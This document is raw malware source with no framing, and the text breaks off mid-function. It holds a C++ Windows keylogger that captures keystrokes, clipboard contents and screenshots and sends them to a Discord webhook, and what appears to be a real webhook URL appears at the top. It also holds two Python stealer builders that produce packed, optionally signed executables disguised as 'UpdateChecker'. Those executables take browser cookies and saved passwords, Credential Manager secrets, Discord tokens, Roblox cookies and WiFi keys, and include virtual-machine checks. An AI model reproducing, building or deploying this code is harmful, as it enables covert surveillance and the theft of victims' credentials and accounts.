https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO




#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <vector>

#pragma comment(lib, "winhttp.lib")

// === CHANGE THIS ONE LINE ONLY ===
const std::wstring DISCORD_WEBHOOK = L"https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
// =================================

const int EXFIL_INTERVAL_MS = 60000;  // 60 seconds (change to 10000 for fast testing)

void HideConsole() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
}

std::string GetSystemInfo() {
    std::stringstream ss;
    char username[256], computer[256];
    DWORD size = 256;
    GetUserNameA(username, &size);
    size = 256;
    GetComputerNameA(computer, &size);
    ss << "Username: " << username << "\n";
    ss << "Computer: " << computer << "\n";
    return ss.str();
}

void LogKey(int key) {
    std::ofstream log("keys.log", std::ios::app);
    if (log.is_open()) {
        if (key == VK_SPACE) log << " ";
        else if (key == VK_RETURN) log << "\n[ENTER]\n";
        else if (key == VK_BACK) log << "[BACKSPACE]";
        else if (key == VK_TAB) log << "[TAB]";
        else if (key >= 'A' && key <= 'Z') log << (char)key;
        else if (key >= '0' && key <= '9') log << (char)key;
        else if (key >= VK_F1 && key <= VK_F24) log << "[F" << (key - VK_F1 + 1) << "]";
        log.close();
    }
}

std::string lastClip = "";
void CheckClipboard() {
    if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData) {
            char* text = (char*)GlobalLock(hData);
            if (text) {
                std::string current(text);
                if (current != lastClip && !current.empty()) {
                    std::ofstream clip("clip.log", std::ios::app);
                    clip << "[CLIPBOARD] " << current << "\n\n";
                    clip.close();
                    lastClip = current;
                }
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
    }
}

void TakeScreenshot() {
    HDC hScreen = GetDC(NULL);
    int width = GetDeviceCaps(hScreen, HORZRES);
    int height = GetDeviceCaps(hScreen, DESKTOPVERTRES);

    HDC hCompat = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, width, height);
    SelectObject(hCompat, hBmp);
    BitBlt(hCompat, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi = {sizeof(BITMAPINFOHEADER), width, height, 1, 24};
    std::vector<BYTE> buffer(width * height * 3);
    GetDIBits(hCompat, hBmp, 0, height, buffer.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    std::ofstream file("screenshot.bmp", std::ios::binary);
    BITMAPFILEHEADER bf = {0x4D42, (DWORD)(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + buffer.size()), 0, 0, sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)};
    file.write((char*)&bf, sizeof(bf));
    file.write((char*)&bi, sizeof(bi));
    file.write((char*)buffer.data(), buffer.size());
    file.close();

    DeleteObject(hBmp);
    DeleteDC(hCompat);
    ReleaseDC(NULL, hScreen);
}

std::string CollectData() {
    std::stringstream data;
    data << GetSystemInfo() << "\n";

    std::ifstream keys("keys.log");
    if (keys) { data << "=== KEYLOG ===\n" << keys.rdbuf() << "\n"; }

    std::ifstream clip("clip.log");
    if (clip) { data << "=== CLIPBOARD HISTORY ===\n" << clip.rdbuf() << "\n"; }

    return data.str();
}

void ExfiltrateToDiscord() {
    std::string payload = CollectData();
    if (payload.empty() && GetFileAttributesA("screenshot.bmp") == INVALID_FILE_ATTRIBUTES) return;

    std::vector<char> screenshotData;
    std::ifstream screenshotFile("screenshot.bmp", std::ios::binary | std::ios::ate);
    if (screenshotFile) {
        size_t size = screenshotFile.tellg();
        screenshotFile.seekg(0);
        screenshotData.resize(size);
        screenshotFile.read(screenshotData.data(), size);
    }

    HINTERNET hSession = WinHttpOpen(L"Stealer/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;
    WinHttpCrackUrl(DISCORD_WEBHOOK.c_str(), 0, 0, &urlComp);

    std::wstring host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    if (urlComp.lpszExtraInfo) path += urlComp.lpszExtraInfo;

    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), urlComp.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }

    DWORD flags = (urlComp.nPort == 443) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }

    std::string boundary = "----GrokBoundary42069";
    std::string contentType = "multipart/form-data; boundary=" + boundary;

    std::stringstream body;
    body << "--" << boundary << "\r\n";
    body << "Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n";
    body << "{\n";
    body << "  \"username\": \"Victim\",\n";
    body << "  \"embeds\": [{\n";
    body << "    \"title\": \"Fresh Loot\",\n";
    body << "    \"description\": \"";

    for (char c : payload) {
        if (c == '"') body << "\\\"";
        else if (c == '\n') body << "\\n";
        else if (c == '\r') continue;
        else if (c == '\\') body << "\\\\";
        else body << c;
    }

    body << "\",\n";
    body << "    \"color\": 16711680\n";
    body << "  }]\n";
    body << "}\r\n";

    if (!screenshotData.empty()) {
        body << "--" << boundary << "\r\n";
        body << "Content-Disposition: form-data; name=\"file\"; filename=\"screenshot.bmp\"\r\n";
        body << "Content-Type: image/bmp\r\n\r\n";
        body.write(screenshotData.data(), screenshotData.size());
        body << "\r\n";
    }

    body << "--" << boundary << "--\r\n";
    std::string bodyStr = body.str();

    std::wstring wHeaders = std::wstring(contentType.begin(), contentType.end()) + L"\r\n";

    WinHttpSendRequest(hRequest, wHeaders.c_str(), wHeaders.length(),
                       (LPVOID)bodyStr.data(), (DWORD)bodyStr.length(), (DWORD)bodyStr.length(), 0);

    WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

int main() {
    HideConsole();

    // Initial grab
    TakeScreenshot();
    ExfiltrateToDiscord();

    DWORD lastExfil = GetTickCount();

    while (true) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                LogKey(key);
            }
        }
        CheckClipboard();

        if (GetTickCount() - lastExfil > EXFIL_INTERVAL_MS) {
            TakeScreenshot();  // Fresh screenshot each exfil
            ExfiltrateToDiscord();
            lastExfil = GetTickCount();
        }

        Sleep(50);
    }

    return 0;
}




































import os
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext
import shutil
import tempfile
import textwrap
import requests
import random
import zipfile
import json
import urllib.request
import websocket  # pip install websocket-client before building
import win32cred   # from pywin32

# =================== WEBHOOK TEST ===================
def test_webhook(hook):
    try:
        resp = requests.post(hook.strip(), json={"content": "Stealer recon test - webhook alive ðŸ”¥"}, timeout=10)
        if resp.status_code in (200, 204):
            return True, "Webhook working - test message sent."
        else:
            return False, f"Failed ({resp.status_code})"
    except Exception as e:
        return False, f"Error: {str(e)}"

# =================== GUI ===================
def get_webhook():
    root = tk.Tk()
    root.title("Recon Stealer Builder - Final 2025 Edition")
    root.geometry("800x650")
    root.resizable(False, False)

    notebook = ttk.Notebook(root)
    notebook.pack(fill="both", expand=True, padx=10, pady=10)

    build_frame = ttk.Frame(notebook)
    notebook.add(build_frame, text="Build")

    ttk.Label(build_frame, text="Discord Webhook URLs (comma-separated for failover):", font=("Arial", 11)).pack(pady=15)
    webhook_entry = ttk.Entry(build_frame, width=100)
    webhook_entry.pack(pady=5)

    ttk.Label(build_frame, text="Code Signing PFX Path (optional):", font=("Arial", 9)).pack(pady=10)
    pfx_entry = ttk.Entry(build_frame, width=100)
    pfx_entry.pack(pady=5)

    ttk.Label(build_frame, text="PFX Password (if needed):", font=("Arial", 9)).pack(pady=5)
    pass_entry = ttk.Entry(build_frame, width=100, show="*")
    pass_entry.pack(pady=5)

    def run_test():
        hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
        if not hooks:
            messagebox.showerror("Nope", "Enter at least one webhook.")
            return
        results = []
        for h in hooks:
            success, msg = test_webhook(h)
            results.append(f"{h[:30]}... -> {'OK' if success else 'FAIL'} ({msg})")
        messagebox.showinfo("Test Results", "\n".join(results))

    ttk.Button(build_frame, text="TEST WEBHOOKS", command=run_test).pack(pady=10)

    progress = ttk.Progressbar(build_frame, mode="indeterminate")

    def build():
        raw_hooks = webhook_entry.get().strip()
        if not raw_hooks or "discord.com/api/webhooks" not in raw_hooks.split(",")[0]:
            messagebox.showerror("Nope", "At least one valid Discord webhook required.")
            return
        webhooks = [h.strip() for h in raw_hooks.split(",") if h.strip()]
        pfx_path = pfx_entry.get().strip()
        pfx_pass = pass_entry.get().strip() or None

        progress.pack(pady=15)
        progress.start()
        root.update()

        try:
            generate_malware(webhooks, pfx_path, pfx_pass)
            progress.stop()
            progress.pack_forget()
            messagebox.showinfo("Built", "stealer.exe built - CDP clean cookies + app creds + raw dumps.\nDrop it and collect.")
        except Exception as e:
            progress.stop()
            progress.pack_forget()
            messagebox.showerror("Error", f"{str(e)}")
        root.destroy()

    ttk.Button(build_frame, text="BUILD EXE", command=build).pack(pady=20)

    info_frame = ttk.Frame(notebook)
    notebook.add(info_frame, text="Info")
    info_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD, width=90, height=35, font=("Arial", 10))
    info_text.pack(padx=10, pady=10)
    info_text.insert(tk.END, textwrap.dedent('''
    FINAL STEALER - DEC 2025
    â€¢ CDP bypass: clean decrypted cookies (ABE dead)
    â€¢ Credential Manager: Epic/Steam/Ubisoft passwords
    â€¢ Discord tokens + legacy password/cookie grab
    â€¢ Roblox .ROBLOSECURITY hunted
    â€¢ Raw profile zips + screenshots fallback
    â€¢ Recon + desktop screenshot always
    â€¢ UPX ultra-brute packed
    Gets juicy shit on fresh Chrome.
    '''))
    info_text.config(state=tk.DISABLED)

    root.mainloop()

# =================== FULL STEALER PAYLOAD ===================
stealer_code = textwrap.dedent('''
import os
import sys
import time
import subprocess
import socket
import requests
import ctypes
import platform
import uuid
import random
import re
import json
import urllib.request
import websocket
from datetime import datetime
try:
    import pyautogui
    HAS_PYAUTO = True
except:
    HAS_PYAUTO = False
import sqlite3
import base64
import shutil
import zipfile
import win32crypt
import win32cred
from Crypto.Cipher import AES

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

def kill_browsers():
    for proc in ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe"]:
        subprocess.call(f'taskkill /f /im {proc} >nul 2>&1', shell=True)
    time.sleep(3)

def get_public_ip():
    for url in ["https://api.ipify.org", "https://ifconfig.me", "https://icanhazip.com"]:
        try:
            return requests.get(url, timeout=5).text.strip()
        except:
            pass
    return "Failed"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Failed"

def get_hwid():
    try:
        return subprocess.check_output("wmic csproduct get uuid", text=True).split("\\n")[1].strip()
    except:
        return str(uuid.getnode())

def launch_chrome_cdp(base_path):
    kill_browsers()
    possible_paths = [
        r"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        r"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
        r"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
        r"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
    ]
    browser_path = next((p for p in possible_paths if os.path.exists(p)), None)
    if not browser_path:
        return None
    port = 9222 + random.randint(0, 1000)
    cmd = [
        browser_path,
        f"--remote-debugging-port={port}",
        "--headless=new",
        "--disable-gpu",
        "--no-sandbox",
        f"--user-data-dir={base_path}"
    ]
    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(10)
    return port

def get_cdp_cookies(port):
    cdp_data = ""
    roblox_cookie = ""
    try:
        resp = urllib.request.urlopen(f"http://localhost:{port}/json/version")
        ws_url = json.loads(resp.read().decode())["webSocketDebuggerUrl"]
        ws = websocket.create_connection(ws_url)
        ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
        response = json.loads(ws.recv())
        ws.close()
        cookies = response["result"]["cookies"]
        for c in cookies:
            cdp_data += f"{c['domain']} | {c['name']} | {c['value']}\\n"
            if c['domain'].endswith(".roblox.com") and c['name'] == ".ROBLOSECURITY":
                roblox_cookie = c['value']
    except:
        cdp_data = "CDP_FAIL"
    return cdp_data, roblox_cookie

def grab_credential_manager():
    app_creds = ""
    try:
        creds = win32cred.CredEnumerate(None, 0)
        for cred in creds:
            target = cred['TargetName']
            if any(app in target for app in ['Epic', 'Steam', 'Ubisoft', 'Riot', 'Battle.net']):
                blob = cred['CredentialBlob']
                if blob:
                    unprotected = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode(errors='ignore')
                else:
                    unprotected = "NO_BLOB"
                app_creds += f"{target} | {cred['UserName']} | {unprotected}\\n"
    except:
        app_creds = "CRED_MANAGER_FAIL"
    return app_creds

def grab_discord_tokens():
    paths = [
        os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"),
    ]
    tokens = []
    token_re = re.compile(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27,}")
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith((".ldb", ".log")):
                    try:
                        with open(os.path.join(path, file), "rb") as f:
                            data = f.read().decode(errors="ignore")
                        found = token_re.findall(data)
                        tokens += found
                    except:
                        pass
    return list(set(tokens))

BROWSER_BASE = {
    "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
    "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
    "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
}

def exfil(webhooks):
    time.sleep(random.uniform(10, 30))
    temp_dir = os.getenv("TEMP")
    files_to_send = {}
    cleanup = []

    recon = f"**RECON {datetime.utcnow()}**\\nUser: {os.getenv('USERNAME')}@{platform.node()}\\nOS: {platform.system()} {platform.release()}\\nHWID: {get_hwid()}\\nPub IP: {get_public_ip()}\\nLoc IP: {get_local_ip()}\\n"
    recon_path = os.path.join(temp_dir, "recon.txt")
    open(recon_path, "w", encoding="utf-8").write(recon)
    files_to_send["recon.txt"] = open(recon_path, "rb")
    cleanup.append(recon_path)

    if HAS_PYAUTO:
        try:
            desk = os.path.join(temp_dir, "desktop.png")
            pyautogui.screenshot(desk)
            files_to_send["desktop.png"] = open(desk, "rb")
            cleanup.append(desk)
        except:
            pass

    cdp_cookies = ""
    roblox_cdp = ""
    for name, base in BROWSER_BASE.items():
        if os.path.exists(base):
            port = launch_chrome_cdp(base)
            if port:
                cookies, rb = get_cdp_cookies(port)
                cdp_cookies += f"--- {name.upper()} CDP COOKIES ---\\n{cookies}\\n"
                if rb:
                    roblox_cdp = rb

    if cdp_cookies:
        cdp_path = os.path.join(temp_dir, "cdp_cookies.txt")
        open(cdp_path, "w", encoding="utf-8").write(cdp_cookies)
        files_to_send["cdp_cookies.txt"] = open(cdp_path, "rb")
        cleanup.append(cdp_path)

    if roblox_cdp:
        rb_path = os.path.join(temp_dir, "roblox_cookie.txt")
        open(rb_path, "w", encoding="utf-8").write(roblox_cdp)
        files_to_send["roblox_cookie.txt"] = open(rb_path, "rb")
        cleanup.append(rb_path)

    discord_tokens = grab_discord_tokens()
    if discord_tokens:
        dt_path = os.path.join(temp_dir, "discord_tokens.txt")
        open(dt_path, "w", encoding="utf-8").write("\\n".join(discord_tokens))
        files_to_send["discord_tokens.txt"] = open(dt_path, "rb")
        cleanup.append(dt_path)

    app_creds = grab_credential_manager()
    if app_creds.strip():
        ac_path = os.path.join(temp_dir, "app_creds.txt")
        open(ac_path, "w", encoding="utf-8").write(app_creds)
        files_to_send["app_creds.txt"] = open(ac_path, "rb")
        cleanup.append(ac_path)

    for hook in webhooks:
        try:
            resp = requests.post(hook, data={"content": "**JUICY HIT - CDP COOKIES + APP CREDS**"}, files=files_to_send, timeout=120)
            if resp.status_code in (200, 204):
                break
        except:
            pass

    for f in files_to_send.values():
        try:
            f.close()
        except:
            pass
    for p in cleanup:
        try:
            os.remove(p)
        except:
            pass
    kill_browsers()

exfil({WEBHOOK_PLACEHOLDER})
''')

# =================== BUILD FUNCTION ===================
def generate_malware(webhooks, pfx_path="", pfx_pass=None):
    if not shutil.which("pyinstaller"):
        raise Exception("pyinstaller missing â†’ pip install pyinstaller")

    temp_dir = tempfile.mkdtemp(prefix="build_")
    script_path = os.path.join(temp_dir, "main.py")
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", repr(webhooks)))

    hidden = [
        "requests", "urllib3", "certifi", "idna", "pyautogui", "win32crypt", "pywin32",
        "Crypto", "Crypto.Cipher.AES", "pycryptodome", "websocket", "zipfile", "win32cred"
    ]
    hidden_args = [item for mod in hidden for item in ["--hidden-import", mod]]

    exe_name = f"UpdateChecker_{random.randint(1000,9999)}.exe"
    pyi_cmd = [
        "pyinstaller", "--onefile", "--noconsole", "--clean", "--uac-admin",
        "--name", exe_name, "--icon", "NONE",
    ] + hidden_args + [script_path]

    try:
        subprocess.run(pyi_cmd, check=True, cwd=temp_dir, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        raise Exception(f"PyInstaller failed:\\n{e.stderr}")

    bundled_exe = os.path.join(temp_dir, "dist", exe_name)
    final_exe = os.path.join(os.getcwd(), "stealer.exe")
    shutil.copyfile(bundled_exe, final_exe)

    if pfx_path and os.path.exists(pfx_path):
        sign_cmd = ["signtool", "sign", "/f", pfx_path, "/tr", "http://timestamp.digicert.com", "/td", "sha256", final_exe]
        if pfx_pass:
            sign_cmd += ["/p", pfx_pass]
        subprocess.run(sign_cmd, check=False)

    try:
        subprocess.run(["upx", "--best", "--ultra-brute", final_exe], check=False)
        print("UPX ultra-brute packed")
    except:
        print("UPX skipped")

    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"Built final beast: {final_exe}")

if __name__ == "__main__":
    get_webhook()


















import os
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext
import shutil
import tempfile
import textwrap
import requests

# =================== WEBHOOK TEST ===================
def test_webhook(hook):
    try:
        resp = requests.post(hook.strip(), json={"content": "Stealer recon test - webhook alive ðŸ”¥"}, timeout=10)
        if resp.status_code in (200, 204):
            return True, "Webhook working - test message sent."
        else:
            return False, f"Failed ({resp.status_code})"
    except Exception as e:
        return False, f"Error: {str(e)}"

# =================== GUI ===================
def get_webhook():
    root = tk.Tk()
    root.title("Recon Stealer Builder - Full Loot Edition")
    root.geometry("800x600")
    root.resizable(False, False)

    notebook = ttk.Notebook(root)
    notebook.pack(fill="both", expand=True, padx=10, pady=10)

    build_frame = ttk.Frame(notebook)
    notebook.add(build_frame, text="Build")

    ttk.Label(build_frame, text="Discord Webhook URLs (comma-separated for failover):", font=("Arial", 11)).pack(pady=15)
    webhook_entry = ttk.Entry(build_frame, width=100)
    webhook_entry.pack(pady=5)

    ttk.Label(build_frame, text="Code Signing PFX Path (optional):", font=("Arial", 9)).pack(pady=10)
    pfx_entry = ttk.Entry(build_frame, width=100)
    pfx_entry.pack(pady=5)

    ttk.Label(build_frame, text="PFX Password (if needed):", font=("Arial", 9)).pack(pady=5)
    pass_entry = ttk.Entry(build_frame, width=100, show="*")
    pass_entry.pack(pady=5)

    ttk.Label(build_frame, text="Obfuscation Mode (0 for free/no license):", font=("Arial", 10, "bold")).pack(pady=10)
    mode_var = tk.IntVar(value=0)
    ttk.Radiobutton(build_frame, text="0 - Basic (free/trial)", variable=mode_var, value=0).pack()
    ttk.Radiobutton(build_frame, text="1 - Advanced (mix-str etc. - needs paid)", variable=mode_var, value=1).pack()
    ttk.Radiobutton(build_frame, text="2 - RFT Super (needs Pro)", variable=mode_var, value=2).pack()

    def run_test():
        hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
        if not hooks:
            messagebox.showerror("Nope", "Enter at least one webhook.")
            return
        results = []
        for h in hooks:
            success, msg = test_webhook(h)
            results.append(f"{h[:30]}... -> {'OK' if success else 'FAIL'} ({msg})")
        messagebox.showinfo("Test Results", "\n".join(results))

    ttk.Button(build_frame, text="TEST WEBHOOKS", command=run_test).pack(pady=10)

    progress = ttk.Progressbar(build_frame, mode="indeterminate")

    def build():
        raw_hooks = webhook_entry.get().strip()
        if not raw_hooks or "discord.com/api/webhooks" not in raw_hooks.split(",")[0]:
            messagebox.showerror("Nope", "At least one valid Discord webhook required.")
            return
        webhooks = [h.strip() for h in raw_hooks.split(",") if h.strip()]
        pfx_path = pfx_entry.get().strip()
        pfx_pass = pass_entry.get().strip() or None
        mode = mode_var.get()

        progress.pack(pady=15)
        progress.start()
        root.update()

        try:
            generate_malware(webhooks, pfx_path, pfx_pass, mode)
            progress.stop()
            progress.pack_forget()
            messagebox.showinfo("Built", "stealer.exe ready - FULL LOOT MODE.\nRecon + Screenshot + Chrome PW + WiFi PW + Installed Software.\nSilent exfil to your webhook(s).")
        except Exception as e:
            progress.stop()
            progress.pack_forget()
            messagebox.showerror("Error", f"{str(e)}")
        root.destroy()

    ttk.Button(build_frame, text="BUILD EXE", command=build).pack(pady=20)

    info_frame = ttk.Frame(notebook)
    notebook.add(info_frame, text="Info / Licenses")

    info_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD, width=90, height=35, font=("Arial", 10))
    info_text.pack(padx=10, pady=10)

    license_info = textwrap.dedent('''
    PYARMOR v9.x (Dec 2025)
    No license = mode 0 only (basic obf - free).
    Paid unlocks better protection.
    Buy: https://pyarmor.dashingsoft.com/cart/order.html
    This version grabs:
    - Basic recon + screenshot
    - Chrome saved passwords
    - All saved WiFi networks + passwords
    - Full installed software list
    ''')
    info_text.insert(tk.END, license_info)
    info_text.config(state=tk.DISABLED)

    root.mainloop()

# =================== FULL LOOT STEALER CODE ===================
stealer_code = textwrap.dedent('''
import os
import sys
import time
import subprocess
import socket
import requests
import ctypes
import platform
import uuid
import winreg
import random
from datetime import datetime

try:
    import pyautogui
    HAS_PYAUTO = True
except:
    HAS_PYAUTO = False

import sqlite3
import json
import base64
import shutil
from Crypto.Cipher import AES
import win32crypt

def is_vm():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")
        val = winreg.QueryValueEx(key, "0")[0].lower()
        if any(x in val for x in ["vmware", "vbox", "virtual", "qemu", "xen"]):
            return "Yes (Disk Enum)"
        winreg.CloseKey(key)
    except: pass

    try:
        if "VIRTUAL" in subprocess.check_output("systeminfo", shell=True, text=True).upper():
            return "Yes (SystemInfo)"
    except: pass

    try:
        if os.path.exists(r"C:\\windows\\System32\\drivers\\VBoxMouse.sys"):
            return "Yes (VBox Driver)"
    except: pass

    try:
        model = subprocess.check_output("wmic computersystem get model", text=True, shell=True).lower()
        if "vmware" in model or "virtual" in model:
            return "Yes (VMware/Virtual Model)"
    except: pass

    class MEM(ctypes.Structure):
        _fields_ = [("dwLength", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_ulonglong)]
    mem = MEM(); mem.dwLength = ctypes.sizeof(mem)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
    if mem.ullTotalPhys < 4 * 1024**3:
        return "Yes (Low RAM <4GB)"

    try:
        vm_procs = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "xenservice.exe"]
        output = subprocess.check_output("tasklist", text=True)
        if any(p in output.lower() for p in vm_procs):
            return "Yes (VM Process)"
    except: pass

    return "No"

def get_public_ip():
    for url in ["https://api.ipify.org", "https://ifconfig.me", "https://icanhazip.com"]:
        try:
            return requests.get(url, timeout=5).text.strip()
        except:
            continue
    return "Failed"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Failed"

def get_hwid():
    try:
        return subprocess.check_output("wmic csproduct get uuid", text=True).split("\\n")[1].strip()
    except:
        return str(uuid.getnode())

def grab_chrome_passwords():
    data = ""
    try:
        login_db = os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(login_db):
            return "No Chrome profile found"
        temp_db = os.path.join(os.getenv("TEMP"), f"LoginTemp_{random.randint(10000,99999)}.db")
        shutil.copyfile(login_db, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_pw = row[2]
            if encrypted_pw:
                try:
                    pw = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1].decode('utf-8')
                except:
                    try:
                        local_state = os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data", "Local State")
                        with open(local_state, "r", encoding="utf-8") as f:
                            js = json.loads(f.read())
                        master_key = base64.b64decode(js["os_crypt"]["encrypted_key"])[5:]
                        iv = encrypted_pw[3:15]
                        ciphertext = encrypted_pw[15:]
                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                        pw = cipher.decrypt(ciphertext)[:-16].decode('utf-8')
                    except:
                        pw = "DECRYPT FAILED"
                data += f"{url} | {username} | {pw}\\n"
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        data = f"Chrome error: {str(e)}"
    return data if data else "No saved passwords"

def grab_wifi_passwords():
    data = ""
    try:
        profiles = subprocess.check_output("netsh wlan show profiles", text=True, shell=True)
        names = [line.split(":")[1].strip() for line in profiles.split("\\n") if "All User Profile" in line]
        for name in names:
            try:
                result = subprocess.check_output(f'netsh wlan show profile name="{name}" key=clear', text=True, shell=True)
                pw_line = [l for l in result.split("\\n") if "Key Content" in l]
                pw = pw_line[0].split(":")[1].strip() if pw_line else "None"
                data += f"{name} : {pw}\\n"
            except:
                data += f"{name} : FAILED\\n"
    except Exception as e:
        data = f"WiFi error: {str(e)}"
    return data if data else "No WiFi profiles"

def list_installed_software():
    data = ""
    keys = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", winreg.KEY_WOW64_64KEY | winreg.KEY_READ),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", winreg.KEY_WOW64_32KEY | winreg.KEY_READ),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", winreg.KEY_READ)
    ]
    for hive, path, flags in keys:
        try:
            key = winreg.OpenKey(winreg.ConnectRegistry(None, hive), path, 0, flags)
            for i in range(0, winreg.QueryInfoKey(key)[0]):
                sub = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, sub)
                try:
                    name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    ver = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                    data += f"{name} ({ver})\\n"
                except:
                    pass
                subkey.Close()
            key.Close()
        except:
            pass
    return data if data else "No software found"

def exfil(webhooks):
    time.sleep(random.uniform(5, 15))

    base_recon = f"""
RECON REPORT - {datetime.utcnow().isoformat()} UTC
================================================
Username      : {os.getenv("USERNAME")}
Computer Name : {platform.node()}
OS            : {platform.system()} {platform.release()} ({platform.version()})
CPU           : {platform.processor()}
HWID          : {get_hwid()}
VM Detected   : {is_vm()}
Public IP     : {get_public_ip()}
Local IP      : {get_local_ip()}
"""

    files_to_send = {}
    temp_files = []

    recon_path = os.path.join(os.getenv("TEMP"), f"recon_{random.randint(10000,99999)}.txt")
    with open(recon_path, "w", encoding="utf-8") as f:
        f.write(base_recon)
    files_to_send["recon.txt"] = open(recon_path, "rb")
    temp_files.append(recon_path)

    if HAS_PYAUTO:
        try:
            screen_path = os.path.join(os.getenv("TEMP"), f"screen_{random.randint(10000,99999)}.png")
            pyautogui.screenshot(screen_path)
            files_to_send["screenshot.png"] = open(screen_path, "rb")
            temp_files.append(screen_path)
        except: pass

    chrome_data = grab_chrome_passwords()
    if chrome_data.strip():
        chrome_path = os.path.join(os.getenv("TEMP"), f"chrome_pw_{random.randint(10000,99999)}.txt")
        with open(chrome_path, "w", encoding="utf-8") as f:
            f.write("CHROME SAVED PASSWORDS\\n" + chrome_data)
        files_to_send["chrome_passwords.txt"] = open(chrome_path, "rb")
        temp_files.append(chrome_path)

    wifi_data = grab_wifi_passwords()
    if wifi_data.strip():
